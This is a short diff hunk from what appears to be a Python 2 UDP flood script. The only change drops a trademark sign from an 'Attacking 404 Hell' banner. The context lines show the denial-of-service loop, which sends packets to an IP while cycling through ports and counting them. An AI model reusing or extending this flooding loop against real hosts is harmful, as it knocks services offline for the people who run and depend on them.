@@ -115,7 +115,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[91m[+]\033[0m \033[94mAttacking 404 Hell™\033[0m"
+     print "\033[91m[+]\033[0m \033[94mAttacking 404 Hell\033[0m"
      print "\033[94m%s %s %s\033[0m"%(sent,ip,port)
      if port == 65534:
        port = 1
